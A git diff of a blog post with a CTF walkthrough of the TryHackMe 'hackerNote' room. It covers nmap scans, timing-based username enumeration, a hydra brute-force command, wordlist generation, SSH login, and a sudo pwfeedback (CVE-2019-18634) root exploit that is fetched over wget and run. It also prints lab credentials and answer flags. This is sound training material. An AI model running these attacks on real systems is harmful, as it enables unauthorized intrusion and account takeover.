@@ -5,17 +5,26 @@ date:   2022-08-12 11:10:00
 categories: [CTF]
 tags: [test]
 ---
+A custom webapp, introducing username enumeration, custom wordlists and a basic privilege escalation exploit.
 
-THM Room[https://tryhackme.com/room/hackernote](https://tryhackme.com/room/hackernote)
+THM Room [https://tryhackme.com/room/hackernote](https://tryhackme.com/room/hackernote)
 
-## [TASK 1 : Reconnaissance](#)
+# Table of contents
+1. [TASK 1 : Reconnaissance](#Reconnaissance)
+2. [TASK 2 : Investigate](#Investigate)
+3. [TASK 3 : Exploit](#Exploit)
+4. [TASK 4 : Attack Passwords](#AttackPasswords)
+5. [TASK 5 : Escalate](#Escalate)
 
-###  Which ports are open? (in numerical order)
 
-```
+## **TASK 1 : Reconnaissance** <a name="Reconnaissance"></a>
+
+####  Which ports are open? (in numerical order)
+
+```console
 root@ip-10-10-127-246:~# nmap -sC -vv 10.10.127.143  
  
-\[...\]  
+[...]  
 PORT  STATE SERVICE  REASON  
 22/tcp open ssh    syn-ack ttl 64  
 | ssh-hostkey:  
@@ -24,206 +33,204 @@ PORT  STATE SERVICE  REASON
 | 256 6f:18:27:a4:e7:21:9d:4e:6d:55:b3:ac:c5:2d:d5:d3 (ECDSA)  
 | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHKcOFLvSTrwsitMygOlMRDEZIfujX3UEXx9cLfrmkYnn0dHtHsmkcUUMc1YrwaZlDeORnJE5Z/NAH70GaidO2s=  
 | 256 2d:c3:1b:58:4d:c3:5d:8e:6a:f6:37:9d:ca:ad:20:7c (EdDSA)  
-|\_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGFFNuuI7oo+OdJaPnUbVa1hN/rtLQalzQ1vkgWKsF9z  
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGFFNuuI7oo+OdJaPnUbVa1hN/rtLQalzQ1vkgWKsF9z  
 80/tcp open http   syn-ack ttl 64  
 | http-methods:  
-|\_ Supported Methods: GET HEAD POST OPTIONS  
-|\_http-title: Home - hackerNote  
+|_ Supported Methods: GET HEAD POST OPTIONS  
+|_http-title: Home - hackerNote  
 8080/tcp open http-proxy syn-ack ttl 64  
 | http-methods:  
-|\_ Supported Methods: GET HEAD POST OPTIONS  
-|\_http-open-proxy: Proxy might be redirecting requests  
-|\_http-title: Home - hackerNote  
-\[...\]  
+|_ Supported Methods: GET HEAD POST OPTIONS  
+|_http-open-proxy: Proxy might be redirecting requests  
+|_http-title: Home - hackerNote  
+[...]  
 ``` 
 
 Answer : 22,80,8080
 
-### What programming language is the backend written in ?
+#### What programming language is the backend written in ?
 
-```    
+```console
 root@ip-10-10-127-246:~# nmap -sV -sC -vv 10.10.127.143  
   
-\[...\]  
+[...]  
 80/tcp open http  syn-ack ttl 64 Golang net/http server (Go-IPFS json-rpc or InfluxDB API)  
 | http-methods:  
-|\_ Supported Methods: GET HEAD POST OPTIONS  
-|\_http-title: Home - hackerNote  
+|_ Supported Methods: GET HEAD POST OPTIONS  
+|_http-title: Home - hackerNote  
 8080/tcp open http  syn-ack ttl 64 Golang net/http server (Go-IPFS json-rpc or InfluxDB API)  
 | http-methods:  
-|\_ Supported Methods: GET HEAD POST OPTIONS  
-|\_http-open-proxy: Proxy might be redirecting requests  
-|\_http-title: Home - hackerNote  
-\[...\]
+|_ Supported Methods: GET HEAD POST OPTIONS  
+|_http-open-proxy: Proxy might be redirecting requests  
+|_http-title: Home - hackerNote  
+[...]
 ```
 
 Answer : go
 
-## [TASK 2 : Investigate](#)
+## **TASK 2 : Investigate** <a name="Investigate"></a>
 
-### Create your own user account
-    
-
+#### Create your own user account
 No answer : created user john and password 12345 with hint 12345
 
-### Log in to your account
-    
-
+#### Log in to your account
 No answer  
 
-### Try and log in to an invalid user account
-    
-
+#### Try and log in to an invalid user account
 No answer  
 
-### Try and log in to your account, with an incorrect password.
-    
+#### Try and log in to your account, with an incorrect password.
+No answer. Delay before error  
 
-No answer :delay before error  
+#### Notice the timing difference. This allows user enumeration
+No answer. Wrong username is returning "invalid username or password" immediately and clicking "i forgot my password" with a valid username show the hint for this usernme.
 
-### Notice the timing difference. This allows user enumeration
-    
+## **TASK 3 : Exploit** <a name="Exploit"></a>
 
-No answer :Wrong username is returning "invalid username or password" immediately and clicking "i forgot my password" with a valid username show the hint for this usernme.
+#### Try to write a script to perform a timing attack.
+No answer. Download script from [https://raw.githubusercontent.com/NinjaJc01/hackerNoteExploits/master/exploit.py](https://raw.githubusercontent.com/NinjaJc01/hackerNoteExploits/master/exploit.py)
 
-## [TASK 3 : Exploit](#)
-
-### Try to write a script to perform a timing attack.
-    
-
-No answer : download script from[https://raw.githubusercontent.com/NinjaJc01/hackerNoteExploits/master/exploit.py](https://raw.githubusercontent.com/NinjaJc01/hackerNoteExploits/master/exploit.py)
-
-### How many usernames from the list are valid ?
-    
+#### How many usernames from the list are valid ?
 
 Run the script downloaded.  
 Answer : 1
 
-### What are/is the valid username(s) ?
+#### What are/is the valid username(s) ?
     
 
 Answer : james
 
-## [TASK 4 : Attack Passwords](#)
+## **TASK 4 : Attack Passwords** <a name="AttackPasswords"></a>
 
-### Form the hydra command to attack the login API route
+#### Form the hydra command to attack the login API route
     
-
+```shell
 hydra -l james -P wordlist.txt 10.10.127.143 http-post-form "/api/user/login:username=^USER^&amp;password=^PASS^:F=incorrect" -V
+```
 
-### How many passwords were in your wordlist?
+#### How many passwords were in your wordlist?
     
-
 Form the wordlist.txt from known favorites color and number (hint from james "forgotten password") with HASHCAT-UTILS and the two files numbers.txt and colors.txt :
 
+```console
 cp numbers.txt /opt/hashcat-utils/src  
 cp colors.txt /opt/hashcat-utils/src  
 cd /opt/hashcat-utils/src  
 ./combinator.bin colors.txt numbers.txt &gt; wordlist.txt  
 wc wordlist.txt  
 180
+```
 
 Answer : 180
 
-### What was the user's password?
+#### What was the user's password?
     
-
 I do a cluster bomb attack with BURPSUITE and the wordlist.txt and i get the result blue7 password match with a different length.
 
 Answer : bleu7
 
-### Login as the user to the platform
+#### Login as the user to the platform
     
 
 No answer but James let us a note as reminder with his SSH password :dak4ddb37b
 
-### What's the user's SSH password?
+#### What's the user's SSH password?
     
 
-Answer :dak4ddb37b
+Answer : dak4ddb37b
 
-### Log in as the user to SSH with the credentials you have.
+#### Log in as the user to SSH with the credentials you have.
     
-
+```console
 ssh james@10.10.127.143
+```
 
 No answer
 
-### What's the user flag?
+#### What's the user flag?
     
-
+```console
 cat user.txt  
 thm{56911bd7ba1371a3221478aa5c094d68}
+```
 
 Answer :thm{56911bd7ba1371a3221478aa5c094d68}
 
 
 
-## [TASK 5 : Escalate](#)
+## **TASK 5 : Escalate** <a name="Escalate"></a>
 
-### What is the CVE number for the exploit?
+#### What is the CVE number for the exploit?
     
-
 Reading the texttell us the recent CVE is "pwdfeedback" and googling"pwdfeedback" return theCVE-2019-18634.  
 Answer :CVE-2019-18634
 
-### Find the exploit from [https://github.com/saleemrashid/](https://github.com/saleemrashid/) and download the files.
+#### Find the exploit from [https://github.com/saleemrashid/](https://github.com/saleemrashid/) and download the files.
     
-
+```console
 cd Deskstop  
 mkdir cve-2019-18634  
 cd cve-2019-18634  
 git clone https://github.com/saleemrashid/sudo-cve-2019-18634
+```
 
 No answer
 
-### Compile the exploit from Kali linux.
+#### Compile the exploit from Kali linux.
     
-
+```console
 cd sudo-cve-2019-18634  
 make
+```
 
 No answer
 
-### SCP the exploit binary to the box.
+#### SCP the exploit binary to the box.
     
 
 Copy and save this code to the KALI where you downloaded the exploit :
 
+```python
 import http.server  
 import socketserver  
 PORT = 8888  
 Handler = http.server.SimpleHTTPRequestHandler  
 with socketserver.TCPServer(("", PORT), Handler) as http:  
   print("serving at port", PORT)  
-  http.serve\_forever()
+  http.serve_forever()
+```
 
 Run the above code :
 
+```console
 python server.py
+```
 
 No answer
 
-### Run the exploit, get root.
+#### Run the exploit, get root.
     
 
 On the SSH of James :
 
+```console
 cd /tmp  
 wget 10.10.127.246:8888/exploit  
 chmod +x exploit  
 ./exploit  
 id  
 uid=0(root)
+```
 
 No Answer
 
-### What is the root flag?
+#### What is the root flag?
     
-
+```console
 cat /root/root.txt  
 thm{af55ada6c2445446eb0606b5a2d3a4d2}
+```
 
-Answer :thm{af55ada6c2445446eb0606b5a2d3a4d2}
+Answer : thm{af55ada6c2445446eb0606b5a2d3a4d2}
 
 [test]:      http://jekyllrb.com
